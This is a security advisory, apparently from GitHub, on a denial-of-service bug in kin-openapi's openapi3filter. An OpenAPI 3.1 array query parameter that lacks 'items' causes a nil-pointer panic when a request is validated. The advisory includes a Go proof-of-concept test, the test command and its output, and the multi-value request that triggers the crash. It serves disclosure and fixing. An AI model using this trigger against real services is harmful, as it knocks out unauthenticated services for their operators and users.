### Summary

An unauthenticated NULL-pointer dereference (denial of service) exists in the request-validation logic of `github.com/getkin/kin-openapi/openapi3filter`. When an OpenAPI 3.1 operation declares a query parameter with `schema: {type: array}` and **omits** `items` — which is valid under OpenAPI 3.1 and passes `doc.Validate()` — a single crafted GET request causes the query-parameter array decoder to dereference a nil `*openapi3.SchemaRef`, panicking the request-handling goroutine. Severity is High: the trigger requires no authentication and no special privileges, only a matching route.

### Details

During request validation the array decoder for query parameters passes the schema's `Items` field straight into value parsing without checking whether it is nil.

In `openapi3filter/req_resp_decoder.go`, `urlValuesDecoder.parseArray` iterates the raw query values and calls `parseValue` with `schemaRef.Value.Items`:

```
openapi3filter/req_resp_decoder.go:576
func (d *urlValuesDecoder) parseArray(raw []string, schemaRef *openapi3.SchemaRef) ([]any, error) {
	var value []any

	for i, v := range raw {
		item, err := d.parseValue(v, schemaRef.Value.Items)   // line 580 — no nil check on Items
		...
```

For an array schema declared without `items`, `schemaRef.Value.Items` is a genuinely nil `*openapi3.SchemaRef`. `parseValue` immediately dereferences it:

```
openapi3filter/req_resp_decoder.go:604
func (d *urlValuesDecoder) parseValue(v string, schema *openapi3.SchemaRef) (any, error) {
	if len(schema.Value.AllOf) > 0 {   // line 605 — schema is nil -> schema.Value panics
		...
```

`schema` is nil, so `schema.Value` triggers `runtime error: invalid memory address or nil pointer dereference`.

**Reachability (taint path).** The panic is reached purely from a validated document plus an incoming HTTP request, with no application code beyond calling `ValidateRequest`:

- `openapi3filter.ValidateRequest`
- -> `ValidateParameter` (`openapi3filter/validate_request.go:181`)
- -> `decodeStyledParameter` (`:267`)
- -> `decodeValue` (`:344`, taken because `Type.Is("array")`)
- -> `urlValuesDecoder.DecodeArray` (`openapi3filter/req_resp_decoder.go:569`)
- -> `urlValuesDecoder.parseArray` (`:580`)
- -> `parseValue` (`:605`) -> nil dereference panic

**Why the input is legal.** Under OpenAPI 3.1 an array schema is not required to specify `items` (unlike 3.0). A document such as the one in the PoC below loads cleanly and returns no error from `doc.Validate()`, so there is no earlier gate that rejects it. The nil `Items` therefore survives all the way to the decoder.

**Scope — an unguarded sibling decoder.** The other array-decoding paths in this same file already guard against nil `Items` before dereferencing it (the standalone `parseArray` near `openapi3filter/req_resp_decoder.go:1143`, the urlencoded body decoder near `:1441`, the multipart body decoder near `:1587`, and the header decoder). Only the query-parameter decoder, `urlValuesDecoder.parseArray` at `openapi3filter/req_resp_decoder.go:580`, lacks the guard, so it remains exploitable while its siblings are safe.

### PoC

Reproduction is a single self-contained Go test. It builds a minimal OpenAPI 3.1 document whose `/q` operation declares `tags` as `{type: array}` with no `items`, confirms the document is valid, routes an unauthenticated `GET /q?tags=a&tags=b`, and calls `ValidateRequest`. On vulnerable code the call panics; the test's `recover` reports it as a failure.

Steps:

1. Add the file below as `openapi3filter/advisory_poc_test.go`.
2. Run the test command shown underneath.

```go
package openapi3filter_test

import (
	"context"
	"net/http"
	"testing"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const specQueryArrayNoItems = `
openapi: 3.1.0
info: {title: PoC, version: 1.0.0}
paths:
  /q:
    get:
      parameters:
        - name: tags
          in: query
          schema: {type: array}
      responses:
        '200': {description: ok}
`

// TestPoCQueryArrayMissingItemsPanic fails on vulnerable code: a single
// unauthenticated GET request panics the request-handling goroutine.
func TestPoCQueryArrayMissingItemsPanic(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(specQueryArrayNoItems))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		t.Fatalf("validate: %v", err)
	}
	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		t.Fatalf("router: %v", err)
	}

	req, _ := http.NewRequest(http.MethodGet, "/q?tags=a&tags=b", nil)
	route, pathParams, err := router.FindRoute(req)
	if err != nil {
		t.Fatalf("route: %v", err)
	}

	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("VULNERABLE: request handling panicked: %v", r)
		}
	}()
	_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
		Request: req, PathParams: pathParams, Route: route,
		Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
	})
	t.Log("no panic: code appears patched")
}
```

Command:

```
go test ./openapi3filter/ -run TestPoCQueryArrayMissingItemsPanic -v
```

Observed output on the affected version:

```
=== RUN   TestPoCQueryArrayMissingItemsPanic
    advisory_poc_test.go:51: VULNERABLE: request handling panicked: runtime error: invalid memory address or nil pointer dereference
--- FAIL: TestPoCQueryArrayMissingItemsPanic (0.00s)
FAIL
FAIL	github.com/getkin/kin-openapi/openapi3filter	0.043s
FAIL
```

The nil dereference originates at `openapi3filter/req_resp_decoder.go:580` (passing nil `Items`) and manifests at `openapi3filter/req_resp_decoder.go:605` (dereferencing the nil schema). Once `Items` is guarded, `ValidateRequest` returns an ordinary validation result and the test passes.

### Impact

This is a NULL-pointer-dereference denial-of-service (CWE-476) reachable through improper input validation (CWE-20) surfacing as an uncaught panic (CWE-248). Any service that uses `openapi3filter` to validate incoming requests against an OpenAPI 3.1 document containing at least one query parameter typed as an array without an explicit `items` schema is affected. The attacker needs no authentication and no privileges — just the ability to send an HTTP request to a route that carries such a parameter. The request is not even required to supply the array parameter with intent; a routine multi-value query hitting that parameter is enough to trigger the panic.

Caveat on blast radius: under `net/http`'s default per-connection panic recovery, the immediate effect is typically a dropped connection plus a logged stack trace rather than a full process exit. However, if request validation runs outside that recovery — for example in a background worker, a custom server loop, a middleware goroutine, or any code path that does not wrap the panic — the process crashes, turning a single request into a full denial of service.

---

- **Ecosystem:** Go
- **Package:** github.com/getkin/kin-openapi
- **Affected versions:** All released versions up to and including v0.145.0. The query-parameter array decoder (`urlValuesDecoder.parseArray`) has never carried the nil-`items` guard; the related fix in v0.143.0 did not cover this path.
- **CVSS v3.1:** 7.5 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`. (Practical impact can be reduced to a dropped connection plus a logged stack under `net/http`'s default per-connection panic recovery, but the process crashes when validation runs outside that recovery.)
- **CWE:** Primary CWE-476 (NULL Pointer Dereference); also CWE-20 (Improper Input Validation) and CWE-248 (Uncaught Exception).
- **Advisory relationship:** Relates to GHSA-p6wj-qrr4-pgh5 ("OpenAPI 3.1 array schema missing items", patched in v0.143.0). That advisory's fix explicitly covered only the urlencoded, multipart, header, and standalone `parseArray` decoders. The query-parameter decoder `urlValuesDecoder.parseArray` was never guarded, so this is an unfixed sibling of the same class that remains exploitable in the latest release.
